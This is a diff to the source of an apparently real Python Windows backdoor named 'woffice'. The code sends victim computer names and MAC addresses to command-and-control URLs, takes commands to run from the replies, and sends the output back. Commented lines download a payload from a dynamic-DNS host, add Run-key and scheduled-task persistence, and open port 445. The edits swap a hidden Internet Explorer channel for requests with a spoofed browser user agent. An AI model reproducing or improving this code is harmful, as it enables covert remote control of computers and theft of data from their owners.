@@ -22,16 +22,17 @@ import urllib2
 from os import path, access, R_OK
 from uuid import getnode as get_mac
 from subprocess import Popen
-import  win32gui, win32com, pythoncom, win32con
+#import  win32gui, win32com, pythoncom, win32con
 from win32com.client import Dispatch
 from time import sleep
 import _winreg
+from fake_useragent import UserAgent
 
 #cd \python27
 #copy /y "%USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\woffice.py" C:\Python27
 #cd \python27_64
 #copy /y C:\Users\Master.MASTER6\Documents\GitHub\Win-Python-Backdoor\woffice.py C:\Python27_64
-#python "%USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\setwoffice.py" py2exe --includes calendar,email,locale
+#python "%USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\setwoffice.py" py2exe --includes calendar,email,locale,_ssl
 
 def getProxy():
     try:
@@ -100,22 +101,22 @@ CREATE_NO_WINDOW = 0x08000000
 stemp=os.getenv('temp')
 swin=os.getenv('windir')
 suser=os.getenv('USERPROFILE')
-try:
-    if not os.path.exists(suser+'\\woffice.exe'):
+#try:
+#    if not os.path.exists(suser+'\\woffice.exe'):
 ##        f = urllib2.urlopen("http://certificates.ddns.net/woffice.exe")
 ##        with open(suser+'\\woffice.exe', "wb") as code:
 ##            code.write(f.read())
         #subprocess.call('powershell -Command Invoke-WebRequest -Uri "http://certificates.ddns.net/woffice.exe" -OutFile '+suser+'\\woffice.exe', creationflags=CREATE_NO_WINDOW)
         #subprocess.call("cmd /c copy /y "+os.getcwd()+"\\woffice.exe " +suser+"\\woffice.exe", creationflags=CREATE_NO_WINDOW)
         #subprocess.call("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v urlspace /t REG_SZ   /d  "+suser+"\\woffice.exe /f", creationflags=CREATE_NO_WINDOW)
-        subprocess.call("cmd /c copy /y "+os.getcwd()+"\\woffice.exe " +swin+"\\woffice.exe", creationflags=CREATE_NO_WINDOW)
-        subprocess.call("netsh advfirewall firewall add rule name=\"Open Port 445\" dir=in action=allow protocol=TCP localport=445", creationflags=CREATE_NO_WINDOW)
+        #subprocess.call("cmd /c copy /y "+os.getcwd()+"\\woffice.exe " +swin+"\\woffice.exe", creationflags=CREATE_NO_WINDOW)
+#        subprocess.call("netsh advfirewall firewall add rule name=\"Open Port 445\" dir=in action=allow protocol=TCP localport=445", creationflags=CREATE_NO_WINDOW)
         #subprocess.call("schtasks /create  /sc minute /mo 10 /tr 'c:\windows\woffice.exe' /tn taskflash /rl highest /F ", creationflags=CREATE_NO_WINDOW)
-except Exception,e:
-    text_file = open(stemp+"\\pippo.txt", "w")
-    text_file.write(str(e))
-    text_file.close()
-    print str(e)
+#except Exception,e:
+#    text_file = open(stemp+"\\pippo.txt", "w")
+#    text_file.write(str(e))
+#    text_file.close()
+#    print str(e)
 #try:
 #    if not os.path.exists('c:\\windows\\wup.exe'):
 #        subprocess.call('powershell -Command Invoke-WebRequest -Uri "http://plano.xoom.it/wofficeie.exe" -OutFile '+suser+'\\wofficeie.exe', creationflags=CREATE_NO_WINDOW)
@@ -140,9 +141,12 @@ except Exception,e:
     text_file.close()
     print str(e)
 sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress+"_app"#+"_"+os.getenv('USERNAME')
-pythoncom.CoInitialize()
-ie = Dispatch("InternetExplorer.Application")
-ie.Visible = 0
+#pythoncom.CoInitialize()
+#ie = Dispatch("InternetExplorer.Application")
+#ie.Visible = 0
+ua = UserAgent()
+#print(ua.chrome)
+header = {'User-Agent':str(ua.chrome)}
 #while True:
 for site in sites:
         #sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress+"_"+os.getenv('USERNAME')
@@ -152,15 +156,18 @@ for site in sites:
             try:
                     #top_level_url="http://52.26.124.145:31287"                    
                     top_level_url = "http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+str(sTime)
+                    sresponse = requests.get(top_level_url, headers=header)
                     
-                    ie.Navigate(top_level_url)
-                    if ie.Busy:
-                        sleep(5)
-                    sresponse = ie.Document.body.innerText
+                    
+                    #ie.Navigate(top_level_url)
+                    #if ie.Busy:
+                    #    sleep(5)
+                    #sresponse = ie.Document.body.innerText
                     #print text
                     #ie.quit
                     #os.system('taskkill /f /im iexplore.exe')
-                    if sresponse!= '':
+                    if sresponse.status_code == 200:#httplib.OK:
+                    #if sresponse!= '':
                             print "Output from HTML request"
                             #sresponse = response.read()
                             ifind=sresponse.find('ip=')
@@ -176,33 +183,33 @@ for site in sites:
                             ifind=sresponse.find('cmd=')
                             scmd = sresponse[ifind+4:sresponse.find('||',ifind)]
                             print skill
-                    else:
-                            if site == site1:
-                                site=site2
-                            elif site == site2:
-                                site=site3
-                            elif site == site3:
-                                site=site1
-                            top_level_url = "http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+sTime
-                            ie.Navigate(top_level_url)
-                            if ie.Busy:
-                                sleep(5)
-                            sresponse = ie.Document.body.innerText
-                            print "Output from HTML request"
-                            #sresponse = response.read()
-                            ifind=sresponse.find('ip=')
-                            sip = sresponse[ifind+3:sresponse.find('||',ifind)]
-                            ifind=sresponse.find('port=')
-                            sport = sresponse[ifind+5:sresponse.find('||',ifind)]
-                            ifind=sresponse.find('kill=')
-                            skill = sresponse[ifind+5:sresponse.find('||',ifind)]
-                            ifind=sresponse.find('iout=')
-                            sout = sresponse[ifind+5:sresponse.find('||',ifind)]
-                            ifind=sresponse.find('exec=')
-                            sexec = sresponse[ifind+5:sresponse.find('||',ifind)]
-                            ifind=sresponse.find('cmd=')
-                            scmd = sresponse[ifind+4:sresponse.find('||',ifind)]
-                            print skill
+##                    else:
+##                            if site == site1:
+##                                site=site2
+##                            elif site == site2:
+##                                site=site3
+##                            elif site == site3:
+##                                site=site1
+##                            top_level_url = "http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+sTime
+##                            ie.Navigate(top_level_url)
+##                            if ie.Busy:
+##                                sleep(5)
+##                            sresponse = ie.Document.body.innerText
+##                            print "Output from HTML request"
+##                            #sresponse = response.read()
+##                            ifind=sresponse.find('ip=')
+##                            sip = sresponse[ifind+3:sresponse.find('||',ifind)]
+##                            ifind=sresponse.find('port=')
+##                            sport = sresponse[ifind+5:sresponse.find('||',ifind)]
+##                            ifind=sresponse.find('kill=')
+##                            skill = sresponse[ifind+5:sresponse.find('||',ifind)]
+##                            ifind=sresponse.find('iout=')
+##                            sout = sresponse[ifind+5:sresponse.find('||',ifind)]
+##                            ifind=sresponse.find('exec=')
+##                            sexec = sresponse[ifind+5:sresponse.find('||',ifind)]
+##                            ifind=sresponse.find('cmd=')
+##                            scmd = sresponse[ifind+4:sresponse.find('||',ifind)]
+##                            print skill
                     #httpServ.close()
                     if sexec == '1':
                             sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress+"_app"
@@ -235,16 +242,18 @@ for site in sites:
                                         #sdump = sdump.replace(" ", "%20")
                                         #sdump = sdump[ 0 : 2005]
                                         top_level_url = "http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&dump="+sdump
-                                        ie.Navigate(top_level_url)
-                                        if ie.Busy:
-                                            sleep(5)
-                                        sresponse = ie.Document.body.innerText
+                                        sresponse = requests.get(top_level_url, headers=header)
+##                                        ie.Navigate(top_level_url)
+##                                        if ie.Busy:
+##                                            sleep(5)
+##                                        sresponse = ie.Document.body.innerText
                                         
                                         top_level_url = "http://"+site+"/svc/dump.php?pc="+sCOMPUTERNAME+"&dump="+sdump
-                                        ie.Navigate(top_level_url)
-                                        if ie.Busy:
-                                            sleep(5)
-                                        sresponse = ie.Document.body.innerText
+                                        sresponse = requests.get(top_level_url, headers=header)
+##                                        ie.Navigate(top_level_url)
+##                                        if ie.Busy:
+##                                            sleep(5)
+##                                        sresponse = ie.Document.body.innerText
                                        
                                             
                                     else:
@@ -266,11 +275,11 @@ for site in sites:
                                                     
                             #httpServ = httplib.HTTPConnection(site, 80)
                             #httpServ.connect()
-                           
-                            ie.Navigate("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&exec=0")
-                            if ie.Busy:
-                                    sleep(5)
-                            sresponse = ie.Document.body.innerText
+                            sresponse = requests.get("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&exec=0", headers=header)
+##                            ie.Navigate("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&exec=0")
+##                            if ie.Busy:
+##                                    sleep(5)
+##                            sresponse = ie.Document.body.innerText
                             #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"_"+os.getenv('USERNAME')+"&exec=0")
                             #httpServ.request('GET', "/svc/wup.php?pc="+sCOMPUTERNAME+"&exec=0")
                             #response = httpServ.getresponse()
@@ -287,10 +296,11 @@ for site in sites:
                                     print str(e)
                             #httpServ = httplib.HTTPConnection(site, 80)
                             #httpServ.connect()
-                            ie.Navigate("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&kill=1")
-                            if ie.Busy:
-                                    sleep(5)
-                            sresponse = ie.Document.body.innerText
+                            sresponse = requests.get("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&kill=1", headers=header)
+##                            ie.Navigate("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&kill=1")
+##                            if ie.Busy:
+##                                    sleep(5)
+##                            sresponse = ie.Document.body.innerText
                             #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&kill=1")
                     site=site1
             except Exception,e:
